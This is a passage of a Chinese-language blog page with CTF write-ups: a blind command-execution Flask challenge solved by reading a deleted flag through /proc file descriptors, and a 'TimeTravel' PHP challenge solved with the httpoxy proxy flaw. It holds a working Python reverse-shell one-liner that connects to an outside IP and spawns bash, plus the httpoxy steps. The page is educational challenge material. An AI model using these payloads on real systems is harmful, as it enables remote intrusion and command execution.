<span class="title">shell</span>():</span></span><br><span class="line">    os.system(<span class="string">&quot;rm -f flag.txt&quot;</span>)</span><br><span class="line">    exec_cmd = request.args.get(<span class="string">&#x27;c&#x27;</span>)</span><br><span class="line">    os.system(exec_cmd)</span><br><span class="line">    <span class="keyword">return</span> <span class="string">&quot;1&quot;</span></span><br><span class="line"></span><br><span class="line"><span class="meta">@app.route(&#x27;/&#x27;)</span></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">source</span>():</span></span><br><span class="line">    <span class="keyword">return</span> open(<span class="string">&quot;app.py&quot;</span>,<span class="string">&quot;r&quot;</span>).read()</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> __name__ == <span class="string">&quot;__main__&quot;</span>:</span><br><span class="line">    app.run(host=<span class="string">&#x27;0.0.0.0&#x27;</span>)</span><br></pre></td></tr></table></figure>

<p>我们先分析下几个路由，很明显，我们可以在shell这个路由执行命令，但是他是无回显的，然后接下来我们可以看到，flag.txt这个文件，会先被打开，然后再执行删除命令，所以要如何读到这个flag呢？<br><strong>文件描述符</strong><br>什么是文件描述符：内核利用文件描述符来访问文件。文件描述符是非负整数。打开现存文件或新建文件时，内核会返回一个文件描述符。读写文件也需要使用文件描述符来指定待读写的文件。</p>
<p>例如Python中，当我们open()函数打开一个文件时便创建了一个文件描述符，而后对这个文件描述符使用read()函数便是读取文件描述符中的内容，close()函数用于关闭/销毁这个文件描述符。</p>
<p><strong>文件描述符储存在什么地方：</strong><code>/proc/&lt;pid&gt;/fd&lt;id&gt;</code></p>
<p>也就是说，我们可以通过cat进程中的fd来获取到文件描述符。而文件描述符中就存储着该文件的内容</p>
<p>无回显命令执行，一般都是考虑反弹shell操作，但是这里curl等一些常见命令都执行不了，这有这个可以</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">python3 -c </span><br><span class="line">&#39;</span><br><span class="line">import socket,subprocess,os;</span><br><span class="line">s&#x3D;socket.socket(socket.AF_INET,socket.SOCK_STREAM);</span><br><span class="line">s.connect((&quot;110.42.133.120&quot;,9999));</span><br><span class="line">os.dup2(s.fileno(),0);</span><br><span class="line">os.dup2(s.fileno(),1); </span><br><span class="line">os.dup2(s.fileno(),2);</span><br><span class="line">p&#x3D;subprocess.call([&quot;&#x2F;bin&#x2F;bash&quot;,&quot;-i&quot;]);</span><br><span class="line">&#39;</span><br></pre></td></tr></table></figure>

<p>接下来就使用以下命令</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">cd &#x2F;proc</span><br><span class="line">ls</span><br><span class="line">cd &#x2F;proc&#x2F;[pid]#进程数字</span><br><span class="line">cd &#x2F;porc&#x2F;[pid]&#x2F;fd</span><br><span class="line">cat [文件描述符数字]</span><br></pre></td></tr></table></figure>

<p>进行flag的查找即可<br><img src="https://raw.githubusercontent.com/Hwwg/myphoto/master/20211009135313.png" alt="img" style="zoom:67%;"></p>
<h3 id="小结"><a href="#小结" class="headerlink" title="小结"></a>小结</h3><p>这题的考点让我没想到的是，原来文件描述符里面可以存储文件的信息，只要你有对他进行操作既有，以前都是光用，没想到这个~，现在就明了了</p>
<h2 id="TimeTravel"><a href="#TimeTravel" class="headerlink" title="TimeTravel"></a>TimeTravel</h2><figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line">error_reporting(<span class="number">0</span>);</span><br><span class="line"><span class="keyword">require</span> <span class="keyword">__DIR__</span> . <span class="string">&#x27;/vendor/autoload.php&#x27;</span>;</span><br><span class="line"></span><br><span class="line"><span class="keyword">use</span> <span class="title">GuzzleHttp</span>\<span class="title">Client</span>;</span><br><span class="line"></span><br><span class="line">highlight_file(<span class="keyword">__FILE__</span>);</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span>(<span class="keyword">isset</span>($_GET[<span class="string">&#x27;flag&#x27;</span>])) &#123;</span><br><span class="line">    $client = <span class="keyword">new</span> Client();</span><br><span class="line">    $response = $client-&gt;get(<span class="string">&#x27;http://127.0.0.1:5000/api/eligible&#x27;</span>);</span><br><span class="line">    $content = $response-&gt;getBody();</span><br><span class="line">    $data = json_decode($content, <span class="literal">TRUE</span>);</span><br><span class="line">    <span class="keyword">if</span>($data[<span class="string">&#x27;success&#x27;</span>] === <span class="literal">true</span>) &#123;</span><br><span class="line">      <span class="keyword">echo</span> system(<span class="string">&#x27;/readflag&#x27;</span>);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span>(<span class="keyword">isset</span>($_GET[<span class="string">&#x27;file&#x27;</span>])) &#123;</span><br><span class="line">    highlight_file($_GET[<span class="string">&#x27;file&#x27;</span>]);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span>(<span class="keyword">isset</span>($_GET[<span class="string">&#x27;phpinfo&#x27;</span>])) &#123;</span><br><span class="line">    phpinfo();</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>拿到flag的条件是data[success]的条件为true，这里有个漏洞就是这题的考点<br><a target="_blank" rel="noopener" href="https://github.com/vulhub/vulhub/tree/master/cgi/httpoxy">https://github.com/vulhub/vulhub/tree/master/cgi/httpoxy</a><br>大致就是，如果定义了环境变量http_proxy，php内的http-api就会走这个代理。在这个phpinfo中就开启了cgi模式了，然后可以在服务器写入需要传入的一个true的内容，并在题目那边配置这个地址即可收到我们传入的content</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">HTTP&#x2F;1.1 200 OK</span><br><span class="line">Server: nginx&#x2F;1.14.2</span><br><span class="line">Date: Fri, 06 Mar 2020 18:27:31 GMT</span><br><span class="line">Content-Type: text&#x2F;html; charset&#x3D;UTF-8</span><br><span class="line">Connection: Keep-alive</span><br><span class="line">Content-Length: 16</span><br><span class="line"></span><br><span class="line">&#123;&quot;success&quot;:true&#125;</span><br></pre></td></tr></table></figure>

<img src="https://raw.githubusercontent.com/Hwwg/myphoto/master/20211009144906.png" alt="img" style="zoom:67%;">
<img src="https://raw.githubusercontent.com/Hwwg/myphoto/master/20211009144929.png" alt="img" style="zoom:67%;">

</div><hr></div><nav id="pagination"><div class="pagination"><a class="extend prev" rel="prev" href="/page/2/"><i class="fa fa-chevron-left"></i></a><a class="page-number" href="/">1</a><a class="page-number" href="/page/2/">2</a><span class="page-number current">3</span><a class="page-number" href="/page/4/">4</a><span class="space">&hellip;</span><a class="page-number" href="/page/19/">19</a><a class="extend next" rel="next" href="/page/4/"><i class="fa fa-chevron-right"></i></a></div></nav></div></div><footer><div class="layout" id="footer"><div class="copyright">&copy;2013 - 2021 By vague huang</div><div class="framework-info"><span>Driven - </span><a target="_blank" rel="noopener" href="http://hexo.io"><span>Hexo</span></a><span class="footer-separator">|</span><span>Theme - </span><a target="_blank" rel="noopener" href="https://github.com/Molunerfinn/hexo-theme-melody"><span>Melody</span></a></div><div class="busuanzi"><script async src="//busuanzi.ibruce.info/busuanzi/2.3/busuanzi.pure.mini.js"></script><span id="busuanzi_container_site_uv"><i class="fa fa-user"></i><span id="busuanzi_value_site_uv"></span><span></span></span><span class="footer-separator">|</span><span id="busuanzi_container_site_pv"><i class="fa fa-eye"></i><span id="busuanzi_value_site_pv"></span><span></span></span></div></div></footer><i class="fa fa-arrow-up" id="go-up" aria-hidden="true"></i><script src="https://cdn.jsdelivr.net/npm/animejs@latest/lib/anime.min.js"></script><script src="https://cdn.jsdelivr.net/npm/jquery@latest/dist/jquery.min.js"></script><script src="https://cdn.jsdelivr.net/npm/@fancyapps/fancybox@latest/dist/jquery.fancybox.min.js"></script><script src="https://cdn.jsdelivr.net/npm/velocity-animate@latest/velocity.min.js"></script><script src="https://cdn.jsdelivr.net/npm/velocity-ui-pack@latest/velocity.ui.min.js"></script><script src="/js/utils.js?version=1.9.0"></script><script src="/js/fancybox.js?version=1.9.0"></script><script src="/js/sidebar.js?version=1.9.0"></script><script src="/js/copy.js?version=1.9.0"></script><script src="/js/fireworks.js?version=1.9.0"></script><script src="/js/transition.js?version=1.9.0"></script><script src="/js/scroll.js?version=1.9.0"></script><script src="/js/head.js?version=1.9.0"></script><script>if(/Android|webOS|iPhone|iPod|iPad|BlackBerry/i.test(navigator.userAgent)) {
  $('#nav').addClass('is-mobile')
  $('footer').addClass('is-mobile')
  $('#top-container').addClass('is-mobile')
}</script><script src="/live2dw/lib/L2Dwidget.min.js?094cbace49a39548bed64abff5988b05"></script><script>L2Dwidget.init({"pluginRootPath":"live2dw/","pluginJsPath":"lib/","pluginModelPath":"assets/","tagMode":false,"debug":false,"model":{"jsonPath":"/live2dw/assets/hijiki.model.json"},"display":{"position":"right","width":150,"height":300},"mobile":{"show":true},"log":false});</script></body></html>